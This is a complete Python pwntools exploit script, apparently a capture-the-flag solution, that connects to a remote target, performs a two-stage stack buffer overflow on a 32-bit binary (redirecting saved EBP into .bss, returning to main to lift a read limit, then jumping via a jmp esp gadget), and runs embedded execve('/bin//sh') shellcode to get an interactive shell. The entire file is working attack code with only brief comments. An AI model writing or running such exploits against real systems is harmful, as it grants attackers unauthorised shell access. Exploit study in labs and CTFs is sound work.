#!/usr/bin/env python3
from pwn import *
import time
import getopt
import sys

opts,argv=getopt.getopt(sys.argv[1:], 't:p:')

for k,v in opts:
    if k == '-t':
        target=v
    elif k == '-p':
        port=v

io=remote(target, port)

#sleep(10)

main_ret=0x08049217       # Return to main, just after push 0x1f, effectively bypassing 31 bytes read limit
main_buff=0x804b827       # A writable address
jmp_esp=0x0804919f

shellcode=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xc1\x99\xb0\x0b\xcd\x80"

# First read() takes in 31 bytes
# Supply a writable address and return to main

payload=b"A"*14
payload+=p32(main_buff)   # Overwrite saved EBP to change main's buff to a writable .bss 
payload+=p32(main_ret)    # Return to main
payload+=b"B"*4           # ESP points here after ret, so this controls number of bytes to be read by the second read()
payload+=b"C"*5

# Second read() has 0x42424242 as limit
# Offset to overwrite saved EIP = 18
# ESP points to shellcode after ret

payload+=b"D"*18
payload+=p32(jmp_esp)
payload+=shellcode

io.sendlineafter(b'>', payload)
io.interactive()
